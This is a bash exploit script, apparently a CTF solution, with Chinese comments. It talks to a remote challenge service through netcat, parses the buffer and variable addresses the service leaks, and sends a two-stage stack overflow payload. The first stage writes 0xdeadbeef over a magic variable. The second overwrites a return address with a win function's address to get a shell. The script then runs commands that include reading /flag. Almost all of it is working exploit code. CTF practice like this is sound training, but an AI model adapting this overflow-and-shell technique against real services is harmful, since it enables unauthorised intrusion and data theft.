#!/usr/bin/env bash

HOST=nc1.ctfplus.cn
PORT="$1"

TMPDIR=$(mktemp -d)
TMP=$(mktemp)
IN=$TMPDIR/in
OUT=$TMPDIR/out

mkfifo "$IN" "$OUT"

cleanup() {
    kill "$nc_pid" 2>/dev/null
    wait "$nc_pid" 2>/dev/null
    rm -rf "$TMPDIR"
}

trap cleanup EXIT

# nc 从头到尾只建立一次 TCP 连接
nc "$HOST" "$PORT" <"$IN" >"$OUT" &
nc_pid=$!

# FD 3 给 nc 写 stdin ，FD 4 读取 nc stdout
exec 3>"$IN"
exec 4<"$OUT"

print_upper_a() {
    local n=$1
    local s

    printf -v s '%*s' "$n" ''
    s=${s// /A}

    printf '%s' "$s"
}

print_deadbeef() {
    printf '\xef\xbe\xad\xde' # 魔数小端序
}

print_u64() {
    local x=$1
    local i
    local byte
    local esc

    for ((i = 0; i < 8; i++)); do # (64 bit) / (8 bit/byte) = 8 byte
        # 每次把目标字节移动到最低 8 位，然后用 & 0xff 把它取出来
        byte=$(( (x >> (8 * i)) & 0xff )) # Shell 和 C 一样也有位运算

        # 十进制数→八进制转义序列，这一步的反斜杠是强插字符串的，是 literal 的，等到下一步才表示转义
        printf -v esc '\\%03o' "$byte" # Shell printf -v 参数可以直接把结果储存到变量里

        # 八进制转义序列→字节
        printf '%b' "$esc"
    done
}

print_u48() {
    local x=$1
    local i
    local byte
    local esc

    for ((i = 0; i < 6; i++)); do
        byte=$(( (x >> (8 * i)) & 0xff ))
        printf -v esc '\\%03o' "$byte"
        printf '%b' "$esc"
    done
}

# Level 1

buf=
magic=

while IFS= read -r line <&4; do
    printf '%s\n' "$line"

    # 解析 buf 地址
    if [[ "$line" == *'address of buffer `buf` is about : 0x'* ]]; then
        hex=${line##*0x} # 斩头去尾留中间
        buf=$((16#$hex)) # 按十六进制理解 hex 并将十进制存入 buf

        printf 'tarikko: buf = 0x%x\n' "$buf" # 好观察
    fi

    # 解析 magic 地址
    if [[ "$line" == *'address of variables `magic` is about : 0x'* ]]; then
        hex=${line##*0x}
        magic=$((16#$hex))

        printf 'tarikko: magic = 0x%x\n' "$magic"
    fi

    # 一旦 Payload 出来就 break
    if [[ "$line" == *'Now input your Payload:'* ]]; then
        break
    fi
done

offset=$((magic - buf))

printf 'tarikko: Level 1 offset = %d (0x%x)\n' "$offset" "$offset" # 好观察

{
    print_upper_a "$offset"
    print_deadbeef
    # printf '\n' # 巨坑！！！不能加！！！留在 stdin 里会被第 2 层读到！
} >"$TMP"
cat "$TMP" >&3

# Level 2

win=

while IFS= read -r line <&4; do
    printf '%s\n' "$line"

    if [[ "$line" == *"It's addr about: 0x"* ]]; then
        hex=${line##*0x}
        win=$((16#$hex))

        printf 'tarikko: win = 0x%x\n' "$win"
    fi

    if [[ "$line" == *'Now input your final Payload:'* ]]; then
        break
    fi
done

printf 'tarikko: Level 2 offset = 40\n'

{
    print_upper_a 40
    print_u64 "$win"
    printf '\n'
} >"$TMP"
cat "$TMP" >&3

# 从此刻开始进入了 Shell 环境
printf 'id\n' >&3
printf 'pwd\n' >&3
printf 'ls -la\n' >&3
printf 'cat /flag\n' >&3
printf 'exit\n' >&3

# 继续打印服务器剩余输出
cat <&4